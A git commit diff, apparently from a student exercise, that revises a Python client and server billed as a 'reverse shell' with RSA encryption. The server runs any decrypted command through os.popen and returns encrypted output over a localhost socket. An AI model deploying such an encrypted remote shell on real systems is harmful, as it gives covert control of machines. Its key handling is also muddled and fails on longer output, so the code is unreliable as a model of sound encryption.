f2fec2e07ede9a14a894aa0dedb7376e3016b880
Mafe Avendaño <mfavendannom@correo.udistrital.edu.co>
2022-05-09 12:33:18 -0500

    Ajustando llamada con llaves

--- cliente.py
+++ cliente.py
@@ -1,20 +1,18 @@
 #! /usr/bin/python3
 # coding=utf-8
 
+"""
+Reverse shell + criptografia asimetrica
+"""
+
 import socket
-import base64
 
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
-def decode_base64(received_base64_message):
-    """
-    Function to decode a message in Base64 
-    """
-    base64_bytes = received_base64_message.encode('ascii')
-    message_bytes = base64.b64decode(base64_bytes) 
-    decoded_plaintext_message = message_bytes.decode('ascii')
-    return decoded_plaintext_message
+HOST = "127.0.0.1"
+PORT = 44444
+llave_priv = open("id_rsa", "r").read()
 
 def cifrado(comando, llave_privada):
     '''
@@ -23,42 +21,31 @@ def cifrado(comando, llave_privada):
     param: llave_publica public key
     return base64 encoded encrypted string
     '''
-    
+
     rsakey = RSA.importKey(llave_privada)
     rsakey = PKCS1_OAEP.new(rsakey)
-    comando_bytes = comando.encode("utf-8") #comando debe estar en bytes
-    encrypted = rsakey.encrypt(comando_bytes)
-    print ("encrypted :")
+    encrypted = rsakey.encrypt(comando)
     return encrypted
 
 def descifrado(salida_comando_cifrado_pub, llave_privada):
     """
     Decifrar el comando
     param: command_cifrado_priv String to be decrypted
-    param: llave_publica public key
+    param: llave_privada public key
     return decrypted string
     """
 
-    rsakey = RSA.importKey(llave_privada) 
+    rsakey = RSA.importKey(llave_privada)
     rsakey = PKCS1_OAEP.new(rsakey)
-    decrypted = rsakey.decrypt(b64decode(salida_comando_cifrado_pub)) 
+    decrypted = rsakey.decrypt(salida_comando_cifrado_pub)
     return decrypted
 
- 
-HOST = "127.0.0.1"
-PORT = 44444
-
-#leer llave
-llave_privada = open("id_rsa", "r").read()
-
 while True:
-    #data = str.encode(input(">>: "))
-    data = cifrado(input(">>: "),llave_privada)
+    data = cifrado(input(">>: ").encode("utf-8"), llave_priv)
+
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
         new_socket.connect((HOST, PORT))
         new_socket.sendall(data)
         data = new_socket.recv(1024)
-        data = data.decode() #para que se vea mejor
-        #data = decode_base64(data)
-        data = descifrado(data,llave_privada) #decifrar con llave privada
+        data = descifrado(data,llave_priv)
         print(f"Received data: \n{data}")
--- servidor.py
+++ servidor.py
@@ -1,24 +1,22 @@
 #! /usr/bin/python3
 # coding=utf-8
 
+"""
+Reverse shell + criptografia asimetrica
+"""
+
 import socket
 import os
-import base64
-from base64 import b64decode
 
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
-def decode_base64(received_base64_message):
-    """
-    Function to decode a message in Base64 
-    """
-    base64_bytes = received_base64_message.encode('ascii')
-    message_bytes = base64.b64decode(base64_bytes) 
-    decoded_plaintext_message = message_bytes.decode('ascii')
-    return decoded_plaintext_message
+HOST = "127.0.0.1"
+PORT = 44444
+llave_pub = open("id_rsa.pub", "r").read()
+llave_priv = open("id_rsa", "r").read()
 
-def decifrado(command_cifrado_priv, llave_publica):
+def descifrado(command_cifrado_priv, llave_publica): #pide llave privada
     """
     Decifrar el comando
     param: command_cifrado_priv String to be decrypted
@@ -26,13 +24,10 @@ def decifrado(command_cifrado_priv, llave_publica):
     return decrypted string
     """
 
-    #key = open(private_key_loc, "rb").read() 
-    rsakey = RSA.importKey(llave_publica) 
+    rsakey = RSA.importKey(llave_publica)
     rsakey = PKCS1_OAEP.new(rsakey)
-    decrypted = rsakey.decrypt(b64decode(command_cifrado_priv)) 
-    #decrypted = rsakey.decrypt(command_cifrado_priv) 
+    decrypted = rsakey.decrypt(command_cifrado_priv)
     return decrypted
-    
 
 def cifrado(salida_comando, llave_publica):
     '''
@@ -41,37 +36,31 @@ def cifrado(salida_comando, llave_publica):
     param: llave_publica public key
     return base64 encoded encrypted string
     '''
-    
+
     rsakey = RSA.importKey(llave_publica)
     rsakey = PKCS1_OAEP.new(rsakey)
-    comando_bytes = salida_comando.encode("utf-8") #comando debe estar en bytes
-    encrypted = rsakey.encrypt(comando_bytes)
-    print ("encrypted :")
+    encrypted = rsakey.encrypt(salida_comando)
     return encrypted
 
-HOST = "127.0.0.1"
-PORT = 44444
-
-#leer llave
-llave_publica = open("id_rsa.pub", "r").read()
-
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
-    new_socket.bind((HOST, PORT)) 
+    new_socket.bind((HOST, PORT))
     new_socket.listen()
-    
+
     while True:
         connection, address = new_socket.accept()
         with connection:
             print(f"Connected by {address}")
             data = connection.recv(10240)
-            #if data.decode() != "":
-            #if decifrado(data,llave_publica) != "": #descifrar con llave publica
-            print(f"Received data: {data}")
-            data_decode = decifrado(data,llave_publica)#descifrar con llave publica
-            cmd_output = os.popen(data_decode).read()
-            cmd_output_bytes = cmd_output.encode("utf-8")
-            #base64_bytes = base64.b64encode(cmd_output_bytes)
-            cifrado_bytes = cifrado(cmd_output_bytes,llave_publica) #cifrar con llave publica
-            connection.sendall(cifrado_bytes)
-            #elif not data:
-             #   break
+            if descifrado(data,llave_priv).decode("utf-8") != "":
+                #print(f"Received data: {data}")
+                data_decode = descifrado(data,llave_priv).decode("utf-8")
+                print(data_decode)
+
+                cmd_output = os.popen(data_decode).read()
+                print(cmd_output)
+
+                cmd_output_bytes = cmd_output.encode("utf-8") #debe estar en bytes
+                cifrado_bytes = cifrado(cmd_output_bytes,llave_pub)
+                connection.sendall(cifrado_bytes)
+            elif not data:
+                break
